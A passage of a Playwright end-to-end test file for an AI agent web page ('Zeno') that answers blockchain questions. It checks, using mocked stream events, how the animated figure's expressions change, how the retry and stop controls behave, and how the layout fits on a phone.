    await ask(page, "what is Ironwood?");
    await expect(page.getByText("An answer.")).toBeVisible();

    expect(await context.cookies()).toEqual([]);
    const stored = await page.evaluate(() => ({
      local: Object.keys(localStorage).length,
      session: Object.keys(sessionStorage).length,
    }));
    expect(stored).toEqual({ local: 0, session: 0 });
  });
});

/**
 * Zeno — the figure that persists through the conversation, acting out what the turn is really
 * doing. The mapping itself is pinned by `zeno-mood.test.ts`; these assert the wiring at the
 * page, which a unit test of the pure function cannot see.
 */
test.describe("Zeno, on the agent page", () => {
  test.skip(!AGENT_ON, "NEXT_PUBLIC_AGENT_ENABLED is not set for this build");

  /** The rail's figure: on a wide screen the head-only bar figure is the hidden one. */
  const railZeno = (page: import("@playwright/test").Page) =>
    page.locator("aside svg[data-zeno]:visible");

  test("there is one h1, and it names Zeno", async ({ page }) => {
    await page.goto("/ai-agent");
    await expect(page.locator("h1")).toHaveCount(1);
    await expect(page.locator("h1")).toHaveText("ZENO");
  });

  test("Zeno is on screen before the first question and acts out the turn", async ({ page }) => {
    const stream = await openStream(page);
    await page.goto("/ai-agent");
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "ready");

    await page.getByLabel(/Ask a question/i).fill("what happened in block 3428150?");
    await page.getByRole("button", { name: "send" }).click();
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "thinking");

    // A lookup in flight is reading, and it puts one block on the stack — one per real lookup.
    await stream.push("status", { state: "looking-up", tool: "lookup_block", detail: "3428150" });
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "reading");
    await expect(railZeno(page)).toHaveAttribute("data-zeno-blocks", "1");

    // A calculation reads nothing, so it adds no block.
    await stream.push("status", { state: "looking-up", tool: "calculate", detail: "1 + 1" });
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "thinking");
    await expect(railZeno(page)).toHaveAttribute("data-zeno-blocks", "1");

    await stream.push("delta", { text: "Block 3,428,150 carried 7 transactions." });
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "writing");

    await stream.push("sources", { sources: [] });
    await stream.push("done", { stopReason: "complete" });
    await stream.close();
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "answered");
    // The answer is labelled with Zeno's own prompt, answering the reader's `you>`.
    await expect(page.locator("article").last().getByText("zeno>", { exact: true })).toBeVisible();

    // Clearing the conversation puts Zeno back to waiting.
    await page.getByRole("button", { name: /clear/ }).click();
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "ready");
  });

  test("the server's own closing is labelled, never celebrated, and can be asked again", async ({
    page,
  }) => {
    // `done` carries `unanswered: true` when the text is the loop's "I could not put that answer
    // into words" closing; without the flag the console would celebrate a non-answer.
    const stream = await openStream(page);
    await page.goto("/ai-agent");
    await page.getByLabel(/Ask a question/i).fill("how did that change over the last 30 days?");
    await page.getByRole("button", { name: "send" }).click();
    await stream.push("status", { state: "looking-up", tool: "chain_status", detail: "supply" });
    await stream.push("delta", {
      text: "I could not put that answer into words. I did read shielded pools, so the data is there; the failure is on my side, not the chain's. Ask again, or narrow it to a single figure — that usually works.",
    });
    await stream.push("sources", { sources: [{ label: "shielded pools", href: "/shielded" }] });
    await stream.push("done", { stopReason: "complete", unanswered: true });
    await stream.close();

    await expect(page.getByText("zeno> couldn't answer")).toBeVisible();
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "stuck");
    // The data was read, so the block stays on the stack through the shrug.
    await expect(railZeno(page)).toHaveAttribute("data-zeno-blocks", "1");
    // Not an answer, so nothing to copy.
    await expect(page.getByRole("button", { name: /copy answer/i })).toHaveCount(0);

    // `ask again` sends the same question IN PLACE of the failed turn: one turn on screen, not two.
    await page.getByRole("button", { name: "ask again" }).click();
    await stream.push("delta", { text: "The shielded total rose by 12,345 ZEC." });
    await stream.push("sources", { sources: [] });
    await stream.push("done", { stopReason: "complete" });
    await stream.close();
    await expect(page.getByText(/rose by 12,345 ZEC/)).toBeVisible();
    await expect(page.locator("article")).toHaveCount(1);
    await expect(page.getByText("how did that change over the last 30 days?")).toHaveCount(1);
    await expect(page.getByText(/couldn't answer/)).toHaveCount(0);
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "answered");
  });

  test("a failed request can be asked again; an answer and a stop cannot", async ({ page }) => {
    const stream = await openStream(page);
    await page.goto("/ai-agent");

    // An answer: nothing to retry.
    await page.getByLabel(/Ask a question/i).fill("what is Ironwood?");
    await page.getByRole("button", { name: "send" }).click();
    await stream.push("delta", { text: "Ironwood is the fourth shielded pool." });
    await stream.push("done", { stopReason: "complete" });
    await stream.close();
    await expect(page.getByText(/fourth shielded pool/)).toBeVisible();
    await expect(page.getByRole("button", { name: "ask again" })).toHaveCount(0);

    // The visitor's own stop: their choice, so no retry and no shrug.
    await page.getByLabel(/Ask a question/i).fill("what is Orchard?");
    await page.getByRole("button", { name: "send" }).click();
    await page.getByRole("button", { name: "stop" }).click();
    await expect(page.getByText("You stopped this answer.")).toBeVisible();
    await expect(page.getByRole("button", { name: "ask again" })).toHaveCount(0);
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "ready");

    // A request that produced nothing: the retry is the remedy, and Zeno shrugs.
    await page.getByLabel(/Ask a question/i).fill("what is Sapling?");
    await page.getByRole("button", { name: "send" }).click();
    await stream.push("error", { error: { code: "upstream_unavailable", message: "x" } });
    await stream.close();
    await expect(page.getByRole("button", { name: "ask again" })).toBeVisible();
    await expect(railZeno(page)).toHaveAttribute("data-zeno-expression", "stuck");
  });

  test.describe("on a phone", () => {
    test.use({ viewport: { width: 390, height: 844 } });

    test("Zeno comes into the running turn, and leaves when the answer arrives", async ({
      page,
    }) => {
      const stream = await openStream(page);
      await page.goto("/ai-agent");
      // The bar carries the page's one h1 and Zeno's face; the rail figure is not on screen.
      await expect(page.locator("h1")).toBeVisible();
      await expect(page.locator("aside svg[data-zeno]:visible")).toHaveCount(1);

      await page.getByRole("button", { name: "what is Ironwood?" }).click();
      await stream.push("status", { state: "looking-up", tool: "chain_status", detail: "supply" });
      const stage = page.locator("article svg[data-zeno]:visible");
      await expect(stage).toHaveAttribute("data-zeno-expression", "reading");
      await expect(stage).toHaveAttribute("data-zeno-blocks", "1");

      await stream.push("delta", { text: "Ironwood is the fourth shielded pool." });
      await stream.push("done", { stopReason: "complete" });
      await stream.close();
      await expect(page.getByText(/fourth shielded pool/)).toBeVisible();
      await expect(page.locator("article svg[data-zeno]")).toHaveCount(0);
    });

    test("the console fills the screen: the composer is on it without scrolling", async ({
      page,
    }) => {
      await page.goto("/ai-agent");
      const input = (await page.getByLabel(/Ask a question/i).boundingBox())!;
      expect(input.y + input.height).toBeLessThanOrEqual(844);
      // The disclosures are one scroll below the conversation, never squeezed into it.
      const disclosure = (await page.getByText("what it will not do").boundingBox())!;
      expect(disclosure.y).toBeGreaterThan(input.y);
    });
  });
});
